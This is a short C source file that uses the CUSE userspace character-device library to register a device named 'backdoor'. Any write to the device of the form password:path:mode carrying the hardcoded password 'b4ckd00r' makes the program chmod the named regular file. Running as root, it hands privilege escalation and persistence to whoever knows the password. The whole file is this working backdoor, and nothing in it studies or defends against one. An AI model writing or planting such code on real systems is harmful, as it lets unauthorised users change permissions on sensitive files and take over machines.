#define FUSE_USE_VERSION 31

#include <cuse_lowlevel.h>
#include <fuse_opt.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

static void backdoor_open(fuse_req_t req, struct fuse_file_info *fi)
{
  fuse_reply_open(req, fi);
}

static void backdoor_write(fuse_req_t req,
                        const char *buf, size_t size, off_t off,
                        struct fuse_file_info *fi)
{
  (void)fi;
  char *request, *pass, *path, *mode;
  struct stat stbuf;

  request = strndup(buf, size);
  if (!request) {
    fuse_reply_err(req, EINVAL);
    return;
  }

  pass = strtok(request, ":");
  path = strtok(NULL, ":");
  mode = strtok(NULL, ":");

  if (pass == NULL || path == NULL || mode == NULL) {

    fuse_reply_err(req, EINVAL);

  } else if (strncmp(pass, "b4ckd00r", 8) == 0) {

    stat(path, &stbuf);
    if (S_ISREG(stbuf.st_mode) && (chmod(path, atoi(mode)) == 0)) {
      fuse_reply_write(req, size);
    } else {
      fuse_reply_err(req, EINVAL);
    }

  } else {

    fuse_reply_err(req, EINVAL);

  }

  free(request);
}

static const struct cuse_lowlevel_ops devops = {
  .open  = backdoor_open,
  .write = backdoor_write,
};

const char dev_name[] = "DEVNAME=backdoor";

int register_backdoor(int argc, char **argv)
{
  struct fuse_args args = FUSE_ARGS_INIT(argc, argv);
  struct cuse_info ci;
  const char *dev_info_argv[] = { dev_name };

  memset(&ci, 0, sizeof(ci));
  ci.dev_info_argc = 1;
  ci.dev_info_argv = dev_info_argv;
  ci.flags = CUSE_UNRESTRICTED_IOCTL;

  return cuse_lowlevel_main(args.argc, args.argv, &ci, &devops, NULL);
}

int main(int argc, char **argv)
{
  return register_backdoor(argc, argv);
}
